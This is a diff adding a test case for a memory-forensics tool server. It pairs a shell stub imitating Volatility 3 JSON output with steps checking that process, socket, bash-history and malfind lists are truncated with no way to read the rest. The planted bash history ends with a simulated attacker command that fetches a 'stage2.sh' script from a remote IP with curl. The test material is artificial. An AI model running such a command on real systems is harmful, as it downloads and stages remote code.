@@ -1,0 +1,114 @@
+# Matrix case P4142-004: analyze_memory_summary tells
+# the model to drill into the analyze_memory_* tools for full per-plugin
+# output, but those tools cut their lists at fixed sizes (processes 60,
+# sockets 50, bash commands 200, malfind regions 30) and take no argument to
+# read the rest. The stub returns 65 processes, 55 sockets, 205 commands and
+# 35 regions; the last row of each (proc-last, sock-last, the curl command,
+# region-last) never appears, and calling the tool again with an offset does
+# not help.
+#
+# Volatility is a stub (${STUBS}/vol): it answers `--help` with rc 0 and, for
+# `-q -f <dump> -r json <plugin>`, prints what the Volatility 3 JSON renderer
+# (`-r json`, 2.x) prints for that plugin: a list of row objects with the
+# plugin's column names and an empty "__children" list.
+#   banners.Banners: Offset, Banner
+#   linux.pslist: OFFSET (V), PID, TID, PPID, COMM, UID, GID, EUID, EGID, CREATION TIME, File output
+#   linux.sockstat.Sockstat: NetNS, Process Name, PID, TID, FD, Sock Offset, Family, Type, Proto,
+#     Source Addr, Source Port, Destination Addr, Destination Port, State, Filter
+#   linux.bash: PID, Process, CommandTime, Command
+#   linux.lsmod: Offset, Module Name, Code Size, Taints, Load Arguments, File Output
+#   linux.check_modules: Module Address, Module Name (none hidden here)
+#   linux.malware.malfind.Malfind: PID, Process, Start, End, File output, Protection, Hexdump, Disasm
+case_id: P4142-004
+problem: P4142
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: multi-call
+level: mcp
+realism: common
+coverage: "partial: Volatility output is imitated (no real memory image or symbols)"
+summary: analyze_memory_summary points to the analyze_memory_* tools for full output, but they stop at 60 processes, 50 sockets, 200 commands and 30 regions with no way to request the rest, so the last rows of a 65/55/205/35-row capture cannot be read.
+env:
+  FINDEVIL_VOL: ${STUBS}/vol
+stubs:
+  - name: vol
+    text: |
+      #!/bin/sh
+      # Stub of Volatility 3 (vol) with the JSON renderer output per plugin.
+      plugin=""
+      for a in "$@"; do
+        case "$a" in
+          --help) echo "usage: vol [-h] [-c CONFIG] ... plugin ..."; exit 0 ;;
+          linux.*|banners.*) plugin="$a" ;;
+        esac
+      done
+      rows() {  # rows <count> <printf-format-with-%d-for-index-and-name> <last-name>
+        n=$1; i=1; echo "["
+        while [ $i -le $n ]; do
+          if [ $i -eq $n ]; then name=$3; sep=""; else name="$4$i"; sep=","; fi
+          printf "$2$sep\n" $i "$name" $i
+          i=$((i+1))
+        done
+        echo "]"
+      }
+      case "$plugin" in
+        banners.Banners)
+          echo '[{"Banner": "Linux version 5.15.0-91-generic (buildd@lcy02-amd64-045) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023", "Offset": 1176502592, "__children": []}]' ;;
+        linux.pslist)
+          # PID 1 is systemd; every other process has PPID 1
+          rows 65 '{"COMM": "%.0s%s", "CREATION TIME": "2025-03-01T08:00:01+00:00", "EGID": 0, "EUID": 0, "File output": "Disabled", "GID": 0, "OFFSET (V)": 18446623859397263360, "PID": %d, "PPID": 1, "TID": 0, "UID": 0, "__children": []}' proc-last worker- \
+            | sed 's/"COMM": "worker-1",\(.*\)"PID": 1, "PPID": 1/"COMM": "systemd",\1"PID": 1, "PPID": 0/' ;;
+        linux.sockstat.Sockstat)
+          rows 55 '{"Destination Addr": "%.0s127.0.0.1", "Destination Port": 0, "FD": 3, "Family": "AF_UNIX", "Filter": "-", "NetNS": 4026531840, "PID": 1, "Process Name": "%s", "Proto": "-", "Sock Offset": 18446623859500000000, "Source Addr": "-", "Source Port": %d, "State": "LISTEN", "TID": 1, "Type": "STREAM", "__children": []}' sock-last sock- ;;
+        linux.bash)
+          rows 205 '{"Command": "%.0s%s", "CommandTime": "2025-03-01 10:00:00.000000 UTC", "PID": 812, "Process": "bash", "__children": [], "_n": %d}' "curl -s http://203.0.113.7/stage2.sh" "ls -la /tmp/" ;;
+        linux.lsmod)
+          echo '[{"Code Size": 155648, "File Output": "Disabled", "Load Arguments": "", "Module Name": "ext4", "Offset": 18446744072647737344, "Taints": "", "__children": []}]' ;;
+        linux.check_modules)
+          echo "[]" ;;
+        linux.malware.malfind.Malfind)
+          rows 35 '{"Disasm": "%.0s", "End": 46297115459583, "File output": "Disabled", "Hexdump": "554889e5", "PID": 1, "Process": "%s", "Protection": "rwx", "Start": %d, "__children": []}' region-last region- ;;
+        *)
+          echo "vol: error: invalid choice: $plugin" >&2; exit 2 ;;
+      esac
+fixture:
+  - path: case01/mem.lime
+    hex: 454d694c0100000000000000
+steps:
+  - tool: analyze_memory_summary
+    args: {memory_dump_path: "${EVIDENCE}/case01/mem.lime"}
+  - tool: analyze_memory_processes
+    args: {memory_dump_path: "${EVIDENCE}/case01/mem.lime"}
+  - tool: analyze_memory_network
+    args: {memory_dump_path: "${EVIDENCE}/case01/mem.lime"}
+  - tool: analyze_memory_bash_history
+    args: {memory_dump_path: "${EVIDENCE}/case01/mem.lime"}
+  - tool: analyze_memory_malfind
+    args: {memory_dump_path: "${EVIDENCE}/case01/mem.lime"}
+  # asking for the rest with an offset, as a model would try
+  - tool: analyze_memory_processes
+    args: {memory_dump_path: "${EVIDENCE}/case01/mem.lime", offset: 60}
+expect:
+  - step: 1
+    contains: "Processes: 65"
+  - step: 1
+    contains: "Drill into `analyze_memory_modules` and `analyze_memory_malfind` for full detail"
+  - step: 2
+    contains: "(5 more processes truncated)"
+  - step: 2
+    not_contains: "proc-last"
+  - step: 3
+    contains: "**Sockets observed:** 55"
+  - step: 3
+    not_contains: "sock-last"
+  - step: 4
+    contains: "(5 more commands truncated)"
+  - step: 4
+    not_contains: "203.0.113.7"
+  - step: 5
+    contains: "(5 more regions truncated)"
+  - step: 5
+    not_contains: "region-last"
+  - step: 6
+    not_contains: "proc-last"
